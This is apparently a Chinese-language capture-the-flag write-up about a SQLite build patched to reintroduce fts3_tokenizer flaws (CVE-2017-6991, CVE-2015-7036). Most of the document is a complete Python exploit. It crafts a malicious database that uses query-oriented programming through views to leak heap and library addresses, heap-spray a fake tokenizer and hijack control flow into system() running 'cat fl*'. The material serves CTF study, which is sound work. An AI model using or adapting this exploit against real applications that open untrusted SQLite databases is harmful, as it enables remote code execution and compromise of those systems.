## 题解

### 漏洞

通过对比一下所给的 sqlite3.c 和 sqlite3_patch.c，可以发现做了如下两处修改：两处修改分别还原了 CVE-2017–6991和 CVE-2015–7036。

![1](assets\1.png)



![2](assets\2.png)

从patch我们可以看到，这个是和`fts3_tokenizer`有关的漏洞。`fts3`是`sqlite`的一个不安全的特性，如果开启我们就直接劫持SQLite的控制流或者直接leak出`sqlite`的binary address。

```python
select hex(fts3_tokenizer("simple")); //leak

select fts3_tokenizer("simple", x'4141414141414141'));
create virtual table vt using fts3 (content TEXT); // control flow hijack
```

如果我们可以执行任意的sql 查询， 那么这个题目会很简单。但是从附件中的`cmd`我们知道，我们只能上传一个数据库，然后server会在这个数据库查询一句:

```sql
select world from hello;
```

因此我们要利用`query oriented programming`来完成这个利用, 这个技术的思想是通过`view`的会改变原来的查询语句来完成类似于`rop`的功能。利用步骤如下：

1. leak出堆地址和binary的地址
2. 伪造一个假的`tokenizer`
3. 覆盖`tokenizer`，劫持控制流



### 利用

具体详见exp。

```python
import os
import random
import string
import sqlite3
#from pwn import *


def gen_int2hex_map():
    conn.execute("CREATE TABLE hex_map (int INTEGER, val BLOB);")
    for i in range(256):
        conn.execute("INSERT INTO hex_map VALUES ({}, x'{}');".format(i, ''.join('%02x' % i)))


def math_with_const(output_view, table_operand, operator, const_operand):
    return "CREATE VIEW {} AS SELECT ( (SELECT * FROM {} ) {} ( SELECT '{}') ) as col;".format(output_view,table_operand, operator,const_operand)


def p64(output_view, input_view):
    return """CREATE VIEW {0} AS SELECT cast(
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / 1) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 <<  8)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 16)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 24)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 32)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 40)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 48)) % 256))||
    (SELECT val FROM hex_map WHERE int = (((select col from {1}) / (1 << 56)) % 256)) as blob) as col;""".format(output_view, input_view)


def u64(output_view, input_view):
    return """CREATE VIEW {0} AS SELECT (
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -1,  1)) -1) * (1 <<  0))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -2,  1)) -1) * (1 <<  4))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -3,  1)) -1) * (1 <<  8))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -4,  1)) -1) * (1 << 12))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -5,  1)) -1) * (1 << 16))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -6,  1)) -1) * (1 << 20))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -7,  1)) -1) * (1 << 24))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -8,  1)) -1) * (1 << 28))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -9,  1)) -1) * (1 << 32))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -10, 1)) -1) * (1 << 36))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -11, 1)) -1) * (1 << 40))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -12, 1)) -1) * (1 << 44))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -13, 1)) -1) * (1 << 48))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -14, 1)) -1) * (1 << 52))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -15, 1)) -1) * (1 << 56))) +
    (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM {1}), -16, 1)) -1) * (1 << 60)))) as col;""".format(output_view, input_view)


def fake_obj(output_view, ptr_list):
    if not isinstance(ptr_list, list):
            raise TypeError('fake_obj() ptr_list is not a list')
    from_string = [i.split(".")[0] for i in ptr_list if not i.startswith("x")]
    print(from_string)
    from_string[0] = "FROM " + from_string[0]
    ptrs = "||".join(ptr_list)
    return """CREATE VIEW {0} AS SELECT {1} {2};""".format(output_view, ptrs, " JOIN ".join(from_string))

def heap_spray(output_view, spray_count, sprayed_obj):
    return """CREATE VIEW {0} AS SELECT replace(hex(zeroblob({1})), "00", (SELECT * FROM {2}));""".format(output_view, spray_count, sprayed_obj)

def flip_end(output_view, input_view):
    return """CREATE VIEW {0} AS SELECT
                SUBSTR((SELECT col FROM {1}), -2, 2)||
                SUBSTR((SELECT col FROM {1}), -4, 2)||
                SUBSTR((SELECT col FROM {1}), -6, 2)||
                SUBSTR((SELECT col FROM {1}), -8, 2)||
                SUBSTR((SELECT col FROM {1}), -10, 2)||
                SUBSTR((SELECT col FROM {1}), -12, 2)||
                SUBSTR((SELECT col FROM {1}), -14, 2)||
                SUBSTR((SELECT col FROM {1}), -16, 2) AS col;""".format(output_view, input_view)


def gen_dummy_DDL_stmt(stmt_len):
    table_name = "".join(random.choice(string.ascii_lowercase) for i in range(6))
    base = ("CREATE TABLE {} (a text)".format(table_name))
    assert len(base) < stmt_len
    ret = "CREATE TABLE {} (a{} text)".format(table_name, 'a' * (stmt_len - len(base)))
    return ret


def patch(db_file, old, new):
    assert (len(old) == len(new))
    with open(db_file, "rb") as rfd:
        content = rfd.read()
        offset = content.find(old)
        assert (offset > 100)  # offset found and bigger then sqlite header
        patched = content[:offset] + new + content[offset + len(old):]
    with open(db_file, "wb") as wfd:
        wfd.write(patched)


if __name__ == "__main__":
    DB_FILENAME = 'malicious.db'
    os.system("rm %s" % DB_FILENAME)
    SIMPLE_MODULE_OFFSET =  str(0x15c3a0)
    SYSTEM_ADDRESS = str(0xe8d0)
    gadget = str(0x40E62) # call qword ptr [rax + 0x18]
    gadget2 = str(0x607f9) # mov rdi, rax ; call qword ptr [rax + 0x80]

    # HEAP_OFFSET = str(0xb32fb0 + 0x20 + 0x70)
    HEAP_OFFSET = str(0xb85a80 + 0x6e480 + 0x80)
    
    conn = sqlite3.connect(DB_FILENAME)

    conn.execute("PRAGMA page_size = 65536;")  # long DDL statements tend to split with default page size.
    gen_int2hex_map()
    qop_chain = []

    print("[+] Generating binary leak statements")

    
    qop_chain.append('CREATE VIRTUAL TABLE leak_table USING FTS3(col);')
    qop_chain.append('INSERT INTO leak_table VALUES("haha");')
    qop_chain.append('CREATE VIEW raw_heap_leak AS SELECT leak_table AS col FROM leak_table;')
    qop_chain.append('CREATE VIEW le_heap_leak AS SELECT hex(col) AS col FROM raw_heap_leak;')
    qop_chain.append(flip_end('heap_leak', 'le_heap_leak'))
    qop_chain.append(u64('u64_heap_leak', 'heap_leak'))
    qop_chain.append(math_with_const('u64_heap_spray', 'u64_heap_leak', '+', HEAP_OFFSET))


    qop_chain.append('CREATE VIEW le_bin_leak AS SELECT hex(fts3_tokenizer("simple")) AS col;')
    qop_chain.append(flip_end('bin_leak', 'le_bin_leak'))
    qop_chain.append(u64('u64_bin_leak', 'bin_leak'))

    
    print("[+] Generating offsets calculation statements")
    qop_chain.append(math_with_const('u64_libsqlite_base', 'u64_bin_leak', '-', SIMPLE_MODULE_OFFSET))

    qop_chain.append(math_with_const('u64_system_plt', 'u64_libsqlite_base', '+', SYSTEM_ADDRESS))
    qop_chain.append(math_with_const('u64_gadget', 'u64_libsqlite_base', '+', gadget))
    qop_chain.append(math_with_const('u64_gadget2', 'u64_libsqlite_base', '+', gadget2))
    qop_chain.append(p64('p64_system_plt', 'u64_system_plt'))
    qop_chain.append(p64('p64_gadget', 'u64_gadget'))
    qop_chain.append(p64('p64_gadget2', 'u64_gadget2'))
    qop_chain.append(p64('p64_heap', 'u64_heap_spray'))


    print("[+] Generating Heap Spray statements")

    payload_list = []
    siz = 0x100
    payload = 'T'*siz
    for i in range(0, siz, 8):
        s = "x'%s'" % payload[i: i + 8].encode('hex')
        payload_list.append(s)

    cmd = "cat fl*\x00"
    payload_list[0] = "x'%s'" % cmd.encode('hex')
    payload_list[1] = ("p64_gadget.col")
    payload_list[3] = ("p64_gadget2.col")
    payload_list[16] = ("p64_system_plt.col")
    qop_chain.append(fake_obj('fake_tokenizer', payload_list))

    qop_chain.append(heap_spray('heap_spray', 100000, 'fake_tokenizer'))
    qop_chain.append("create virtual table exploit using fts3(col, tokenize = 'simple');")
    qop_chain.append("create virtual table trigger using fts3(col, tokenize = 'simple');")
    qop_chain.append("drop table exploit_content;")
    overwrite_view = "overwrite_simple_tokenizer"
    qop_chain.append("create view %s(col) as select fts3_tokenizer(\"simple\", p64_heap.col) from p64_heap;" % overwrite_view)
    qop_chain.append("create view exploit_content(docid, c0col) as select 0 , (select col from trigger where col match 'xxxx');")
    overwrite_sql = "select * from %s" % overwrite_view
    qop_chain.append("create view hello(world) as select ((select * from heap_spray) + (select * from overwrite_simple_tokenizer) + (select * from exploit));")
    

    print("[+] Generating dummy DDL statements to be patched")
    dummies = []
    for q_stmt in qop_chain:
        conn.execute(q_stmt)

    conn.commit()
    print("[+] All Done")

```



